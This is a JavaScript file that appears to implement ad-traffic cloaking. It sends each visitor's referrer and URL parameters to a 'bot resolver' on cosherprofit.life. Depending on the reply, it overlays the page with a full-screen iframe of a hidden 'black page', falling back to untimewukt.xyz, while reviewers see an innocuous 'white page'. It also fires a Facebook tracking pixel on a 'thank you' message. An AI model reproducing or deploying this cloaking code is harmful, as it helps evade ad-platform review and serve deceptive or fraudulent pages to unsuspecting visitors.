// IE8
function bindEvent(element, eventName, eventHandler) {
    if (element.addEventListener) {
        element.addEventListener(eventName, eventHandler, false);
    } else if (element.attachEvent) {
        element.attachEvent('on' + eventName, eventHandler);
    }
}

bindEvent(window, 'message', function (e) {
    if (e.data === "thank you") {
        PlaceFacebookPixel("Lead");
    }
});

var referrer = document.referrer;
var urlParamsString = location.search;
var urlParams = new URL(window.location.href).searchParams;
var bundleParam = urlParams.get("bundle");
var botResolverCheckEndpoint = "https://cosherprofit.life/api/can-show";
var botResolverBlackPageLinkEndpoint = "https://cosherprofit.life/api/link";
var defaultBlackPageUrl = "https://untimewukt.xyz";
var whitePageUrl = "https://cosherprofit.life/files/pages/wp.html";

if (bundleParam) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", botResolverCheckEndpoint, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (this.readyState === XMLHttpRequest.DONE) {
            if (this.status === 200 && parseInt(this.responseText) === 1) {
                PlaceBlackPage();
            } 
        }
    };
    xhr.send(JSON.stringify({
        referrer: referrer,
        urlParams: urlParamsString
    }));
}

function PlaceBlackPage() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", botResolverBlackPageLinkEndpoint, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (this.readyState === XMLHttpRequest.DONE) {
            var blackPageUrl = this.status === 200 ? this.responseText : defaultBlackPageUrl;
            PlacePageAsIframe(blackPageUrl);
        }
    };
    xhr.send(JSON.stringify({
        referrer: referrer,
        urlParams: urlParamsString
    }));
}

function PlacePageAsIframe(url) {
    var frame = document.createElement("iframe");
    frame.src = url + urlParamsString;
    frame.style = "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;";
    document.getElementById("sa").appendChild(frame);
}

function PlacePageAsInnerHtml(url) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.onreadystatechange = function () {
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            document.getElementById("sa").innerHTML = this.responseText
        }
    };
    xhr.send(JSON.stringify({
        referrer: referrer,
        urlParams: urlParamsString
    }));
}

function PlaceFacebookPixel(trackAction) {
    var num = urlParams.get("phone");
    ! function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
            n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = '2.0';
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s)
    }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', num);
    fbq('track', trackAction);
    console.log(document.referrer);
}
